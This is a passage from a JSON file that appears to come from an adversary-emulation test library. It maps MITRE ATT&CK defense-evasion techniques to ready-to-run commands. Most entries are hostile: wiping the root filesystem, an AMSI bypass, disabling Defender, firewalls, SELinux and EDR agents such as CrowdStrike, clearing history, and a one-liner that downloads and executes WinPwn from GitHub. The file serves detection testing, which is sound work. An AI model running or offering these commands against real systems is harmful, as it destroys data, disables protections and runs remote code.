            "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
            "command": "del /f %temp%\\deleteme_T1551.004"
         },
         {
            "description": "Use the `shred` command to overwrite the temporary file and then delete it\n",
            "command": "shred -u /tmp/victim-shred.txt"
         },
         {
            "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n",
            "command": "New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null; Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore"
         },
         {
            "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
            "command": "Remove-Item -Path C:\\Users\\puma-4\\Desktop\\deleteme_folder_T1551.004 -Recurse"
         },
         {
            "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n",
            "command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null"
         },
         {
            "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n",
            "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])"
         },
         {
            "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
            "command": "Remove-Item -path C:\\Users\\puma-4\\Desktop\\deleteme_T1551.004"
         },
         {
            "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
            "command": "rmdir /s /q %temp%\\deleteme_T1551.004"
         },
         {
            "description": "Deadman ability to delete agent file after termination.",
            "command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};\n"
         }
      ]
   },
   "T1036.004": {
      "technique_name": "Masquerading: Masquerade Task or Service",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"",
            "command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" && sc qc win32times"
         },
         {
            "description": "Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to \"totally_legit\".  This will show up as process name in simple 'ps' listings.\n",
            "command": "/tmp/T1036_004_prctl_rename & ps; TMP=`ps | grep totally_legit`; if [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi; exit 0"
         },
         {
            "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"",
            "command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f && schtasks /query /tn win32times"
         }
      ]
   },
   "T1562.004": {
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n",
            "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules; grep \"# THIS IS A COMMENT\" /etc/ufw/user.rules"
         },
         {
            "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n",
            "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf"
         },
         {
            "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n",
            "command": "systemctl stop ufw"
         },
         {
            "description": "An adversary tries to modify the windows firewall registry\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f"
         },
         {
            "description": "This test will attempt to allow an executable through the system firewall located in the Users directory",
            "command": "Copy-Item \"f7ce09_AtomicTest.exe\" -Destination \"C:\\Users\\$env:UserName\" -Force; netsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes"
         },
         {
            "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n",
            "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf"
         },
         {
            "description": "An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     \n",
            "command": "netsh firewall set opmode mode=disable"
         },
         {
            "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
            "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f"
         },
         {
            "description": "An adversary tries to modify the windows firewall registry.\n",
            "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force"
         },
         {
            "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n",
            "command": "tail /var/log/ufw.log"
         },
         {
            "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
            "command": "netsh advfirewall set currentprofile state off"
         },
         {
            "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n",
            "command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes && netsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes"
         },
         {
            "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n",
            "command": "ufw logging off"
         },
         {
            "description": "This test will attempt to open a local port defined by input arguments to any profile",
            "command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any"
         },
         {
            "description": "Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) \nAttackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables \nrules, which in fact \"disable\" iptables. \n",
            "command": "iptables-save > /tmp/iptables.rules; iptables -F"
         },
         {
            "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n",
            "command": "ufw disable"
         },
         {
            "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n",
            "command": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450"
         },
         {
            "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n",
            "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw; grep \"# THIS IS A COMMENT\" /etc/default/ufw"
         },
         {
            "description": "Instead of completely \"disabling\" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.\nBy doing so, they may cause less noise to avoid detection. \n",
            "command": "iptables-save > /tmp/iptables.rules; iptables -D OUTPUT -p tcp --dport 21 -j DROP"
         },
         {
            "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n",
            "command": "ufw prepend deny from 1.2.3.4; ufw status numbered"
         }
      ]
   },
   "T1202": {
      "technique_name": "Indirect Command Execution",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n",
            "command": "pcalua.exe -a #{process} && pcalua.exe -a #{payload_path}"
         },
         {
            "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n",
            "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe"
         },
         {
            "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n",
            "command": "conhost.exe \"notepad.exe\""
         }
      ]
   },
   "T1218.002": {
      "technique_name": "Signed Binary Proxy Execution: Control Panel",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n",
            "command": "control.exe \"187e67_calc.cpl\""
         }
      ]
   },
   "T1562.001": {
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
            "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1"
         },
         {
            "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
            "command": "Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; Set-MpPreference -dscrptsc $True; Set-MpPreference -dbaf $True"
         },
         {
            "description": "Disables OpenDNS Umbrella\n",
            "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist"
         },
         {
            "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n",
            "command": "set +o history"
         },
         {
            "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
            "command": "net.exe stop McAfeeDLPAgentService && sc.exe config McAfeeDLPAgentService start= disabled"
         },
         {
            "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n",
            "command": "sysmon -u"
         },
         {
            "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n",
            "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Disable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule"
         },
         {
            "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n",
            "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
            "command": "sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist; sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
         },
         {
            "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
            "command": "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}"
         },
         {
            "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
            "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n MsMpEng.exe"
         },
         {
            "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
            "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
         },
         {
            "description": "Stop and disable Crowdstrike Falcon on Linux\n",
            "command": "sudo systemctl stop falcon-sensor.service; sudo systemctl disable falcon-sensor.service"
         },
         {
            "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
            "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\""
         },
         {
            "description": "reboot system via system request seen in Awfulshred wiper.\n",
            "command": "echo 1> /proc/sys/kernel/sysrq ; echo b> /proc/sysrq-trigger"
         },
         {
            "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
            "command": "Stop-Service -Name McAfeeDLPAgentService; Remove-Service -Name McAfeeDLPAgentService"
         },
         {
            "description": "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n",
            "command": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f"
         },
         {
            "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
            "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All"
         },
         {
            "description": "Kill the event log services for stealth via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); inv-phantom -consoleoutput -noninteractive"
         },
         {
            "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
            "command": "$excludedpath= \"C:\\Temp\"; Add-MpPreference -ExclusionPath $excludedpath"
         },
         {
            "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
            "command": "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBlockAtFirstSeen 1"
         },
         {
            "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
            "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse"
         },
         {
            "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of linux.\n",
            "command": "swapon -a ; sleep 2; swapoff -a; sync"
         },
         {
            "description": "Disables syslog collection\n",
            "command": "if (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) > /dev/null; then : ; else sudo (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog); fi;  ;  systemctl stop rsyslog ; systemctl disable rsyslog"
         },
         {
            "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
            "command": "$excludedProcess = \"outlook.exe\"; Add-MpPreference -ExclusionProcess $excludedProcess"
         },
         {
            "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
            "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force"
         },
         {
            "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
            "command": "sc stop WinDefend && sc config WinDefend start=disabled && sc query WinDefend"
         },
         {
            "description": "Disable the Cb Response service\n",
            "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ]; then   service cbdaemon stop;   chkconfig off cbdaemon; else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];   systemctl stop cbdaemon;   systemctl disable cbdaemon; fi"
         },
         {
            "description": "Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.\n",
            "command": "detectorId=$(aws guardduty create-detector --enable --region \"us-east-1\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*'); aws guardduty update-detector --no-enable --detector-id $detectorId; aws guardduty delete-detector --detector-id $detectorId"
         },
         {
            "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n",
            "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f"
         },
         {
            "description": "Disables Carbon Black Response\n",
            "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist; sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist"
         },
         {
            "description": "Disables macOS Gatekeeper\n",
            "command": "sudo spctl --master-disable"
         },
         {
            "description": "Disables LittleSnitch\n",
            "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist"
         },
         {
            "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
            "command": "$excludedExts= \".exe\"; Add-MpPreference -ExclusionExtension  $excludedExts"
         },
         {
            "description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n",
            "command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"  ( call ) ELSE ( schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ) &&   &&  IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )"
         },
         {
            "description": "Clear Shell History. This technique only affect the bash shell application. \n",
            "command": "history -c"
         },
         {
            "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
            "command": "Try {cmd /c \"C:\\Users\\puma-4\\Desktop\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; if(0){;   $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse;   Try {cmd /c \"C:\\Users\\puma-4\\Desktop\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{};}"
         },
         {
            "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
            "command": "fltmc.exe unload SysmonDrv"
         },
         {
            "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
            "command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet"
         },
         {
            "description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
            "command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\""
         },
         {
            "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n",
            "command": "free && echo 3 > /proc/sys/vm/drop_caches && free; echo 3> /proc/sys/vm/drop_caches"
         },
         {
            "description": "Disables SELinux enforcement\n",
            "command": "setenforce 0"
         },
         {
            "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
            "command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore"
         },
         {
            "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
            "command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f"
         },
         {
            "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
            "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force"
         },
         {
            "description": "Disable Windows Defender Real-Time Protection",
            "command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};\n"
         },
         {
            "description": "Ensure the ExecutionPolicy is turned to Bypass",
            "command": "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\PowerShell -Name ExecutionPolicy -Value ByPass;\n$shell = New-Object -ComObject Wscript.Shell;\nSet-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\");"
         },
         {
            "description": "Disable Windows Defender All",
